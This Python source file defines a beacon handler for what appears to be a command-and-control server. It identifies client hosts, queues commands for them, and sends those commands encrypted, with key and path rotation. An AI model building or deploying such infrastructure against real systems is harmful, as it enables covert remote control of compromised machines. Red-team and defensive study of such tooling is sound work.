import logging
import json

logger = logging.getLogger(__name__)

from handlers.base_handler import BaseHandler

class BeaconHandler(BaseHandler):
    """Handler for beacon requests from clients"""
    
    def handle(self, include_rotation_info=False):
        """
        Process a beacon request from a client
        
        Args:
            include_rotation_info: Whether to include path rotation information
        """
        self.log_message(f"Beacon received from {self.client_address[0]}")
        
        # Extract system info from headers
        system_info_encrypted = self.headers.get('X-System-Info')
        
        # Identify the client
        client_id, system_info, newly_identified = self.client_helper.identify_client(
            self.client_address[0], 
            self.headers,
            system_info_encrypted
        )
        
        # Log the beacon
        self.log_message(f"Identified client {client_id} ({system_info.get('Hostname', 'Unknown')})")
        
        # Verify client if system info is available
        needs_key_rotation = False
        if system_info:
            _, _, needs_key_rotation, _ = self.client_helper.verify_client(client_id, system_info)
        
        # Organize commands for the client
        commands, has_key_rotation = self.client_helper.organize_commands(
            client_id, 
            include_key_rotation=needs_key_rotation
        )
        
        # Add path rotation command if needed
        if include_rotation_info:
            path_rotation_command = self.path_router.create_path_rotation_command()
            commands.append(path_rotation_command)
            self.log_message(f"Sending path rotation info to client {client_id}")
        
        # Log commands being sent
        for command in commands:
            cmd_type = command['command_type']
            args = command['args'] if cmd_type != 'key_rotation' else '[REDACTED KEY]'
            self.client_manager.log_event(client_id, "Command sent", f"Type: {cmd_type}, Args: {args}")
        
        # Send response to client
        self._send_beacon_response(client_id, commands, has_key_rotation)
        
        # Do NOT clear commands after delivery - they should be cleared when results are received
        # We'll only clear key rotation commands since they're handled differently
        if has_key_rotation:
            self.client_helper.clear_commands_after_rotation(client_id)
    
    def _send_beacon_response(self, client_id, commands, has_key_rotation):
        """Send the encrypted response to the client beacon"""
        # Encrypt commands json before sending
        commands_json = json.dumps(commands)
        
        # Encrypt with client-specific key if available
        encrypted_commands = self.crypto_helper.encrypt(commands_json, client_id)
        
        # Set additional headers
        headers = {}
        if has_key_rotation:
            headers["X-Key-Rotation"] = "true"
        
        # Send response
        self.send_response(200, "application/json", encrypted_commands, headers)